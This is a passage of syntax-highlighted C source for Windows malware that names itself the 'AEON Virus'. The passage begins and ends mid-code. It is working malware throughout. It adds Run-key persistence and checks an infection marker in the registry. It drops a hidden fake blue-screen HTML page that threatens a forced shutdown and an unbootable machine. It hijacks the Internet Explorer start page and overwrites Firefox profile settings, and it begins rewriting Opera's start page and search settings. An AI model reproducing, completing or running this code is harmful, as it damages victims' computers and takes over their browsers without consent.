    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon4"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir4</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon5"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir5</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Check if the PC is infected by checking HKEY_LOCAL_MACHINE\SYSTEM\Aeon for " Aeon " = " Aeon " */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsPCInfected</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwBufLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SYSTEM\\Aeon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwBufLength</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'A'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc7">'e'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]!=</span><span class="sc7">'o'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]!=</span><span class="sc7">'n'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Drop a HTML-File into %sysdir% and change Internet Explorer Start Page value in Registry to it */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">IEStartPageBSoD</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szStartPage</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBSoD</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"&lt;html&gt;&lt;head&gt;&lt;title&gt;=== Infected with the AEON Virus ===&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#0000AA\"&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;h2&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;center&gt;&lt;FONT style=\"BACKGROUND-COLOR: #A9A9A9\" color=\"#000AA\"&gt;Windows&lt;/FONT&gt;&lt;/center&gt;&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;font face=\"Courier New\" color=\"#FFFFFF\"&gt;&lt;SPAN style=\"font-size:12pt;\"&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;center&gt;A fatal exception ERROR has occured at 0xEOF.&lt;br&gt;&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"Your computer has been infected with the &lt;u&gt;AEON&lt;/u&gt; virus..."</span><span class="sc0">
                    </span><span class="sc6">"This screen might be the last you see for a while,&lt;br&gt;after finishing different operations,&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;u&gt;AEON&lt;/u&gt; will start a countdown of 60 000 milliseconds, which are 60 seconds.&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"After this 60 seconds the computer will be forced to poweroff.&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"The moment this happened you won't be able to access your Windows any more,&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"the bootloader can not be started and you will get an error message instead of a boot screen.&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"And even if you would be able to access your machine after the shutdown,&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"do not think anything will be as it was before, different things have been changed.&lt;br&gt;"</span><span class="sc0">
                    </span><span class="sc6">"&lt;br&gt;&lt;br&gt;[SkyOut]&lt;br&gt;[Electrical Ordered Freedom]&lt;/center&gt;&lt;/SPAN&gt;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\BSoD.html"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create a possible old file */</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create the new one */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBSoD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBSoD</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Write the needed Registry values in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Internet Explorer\\Main"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Start Page"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Internet Explorer\\Main"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Start Page"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Make the file hidden */</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">szStartPage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Reset all Firefox settings and change the Start Page value in pref.js to the HTML-File dropped by IEStartPageBSoD() */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FirefoxStartPageBSoD</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFind</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szProfileFolder</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szProfileFolder2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szPrefJS</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0"> 

    </span><span class="sc1">/* Get the location of %sysdir% (normally C:\WINDOWS\system32) */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc1">/* Create two lines of preferences, which should be set for Firefox:
        - user_pref("browser.startup.homepage", "file:///C:\WINDOWS\system32\BSoD.html");
        - user_pref("general.useragent.override", "[AEON] Virus - SkyOut - [Electrical Ordered Freedom]");
    */</span><span class="sc0">

    </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szPrefJS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"user_pref(\"browser.startup.homepage\", \"file:///"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szPrefJS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szPrefJS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\BSoD.html\");\r\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Help -&gt; About Mozilla Firefox (Useragent string is changed) */</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szPrefJS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"user_pref(\"general.useragent.override\", \"[AEON] Virus - SkyOut - [Electrical Ordered Freedom]\");"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Get the location of APPDATA directory, normally C:\Documents and Settings\&lt;USERNAME&gt;\Application Data */</span><span class="sc0">
    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_APPDATA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileFolder</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Mozilla\\Firefox\\Profiles"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_APPDATA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileFolder2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Mozilla\\Firefox\\Profiles"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\\*"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Search for the first file in the directory APPDATA\Mozilla\Firefox\Profiles, which is the directory containing all 
    Firefox profiles */</span><span class="sc0">
    </span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">w32FD</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* If filename is " . " or " .. " just continue */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!((</span><span class="sc11">strcmp</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".."</span><span class="sc10">))))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">((</span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">szProfileFolder2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">)));</span><span class="sc0">
        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* If we have found a directory (thats what we searh for) we go into it and overwrite the preferences file " pref.js " with
        the two setting we created above, first time user will start Firefox will set several other setting and it will start with
        a Mozilla Start Page */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">szProfileFolder</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"prefs.js"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szPrefJS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szPrefJS</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">w32FD</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc1">/* Close handle when no files can be found anymore */</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Change the Start Page value in opera6.ini to the HTML-File created by IEStartPageBSoD() and change all Search Engine values in search.ini */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OperaStartPageBSoD</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szProfileIni</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSearchIni</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSearchEngine</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* APPDATA (look above function) -&gt; APPDATA\Opera\Opera\profile\opera6.ini, preferences file */</span><span class="sc0">
    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_APPDATA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileIni</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szProfileIni</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Opera\\Opera\\profile\\opera6.ini"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* APPDATA (look above function) -&gt; APPDATA\Opera\Opera\profile\search.ini, file containing information about the Search Engnines */</span><span class="sc0">
    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_APPDATA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSearchIni</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSearchIni</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Opera\\Opera\\profile\\search.ini"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\BSoD.html"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Change Start Page to the file created by IEStartPageBSoD() */</span><span class="sc0">
    </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"User Prefs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Home URL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileIni</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Value 2 means the Home URL specified location will be opened */</span><span class="sc0">
    </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"User Prefs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Startup Type"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"2"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileIni</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* No warning will be displayed if Opera is not the systems stanard browser */</span><span class="sc0">
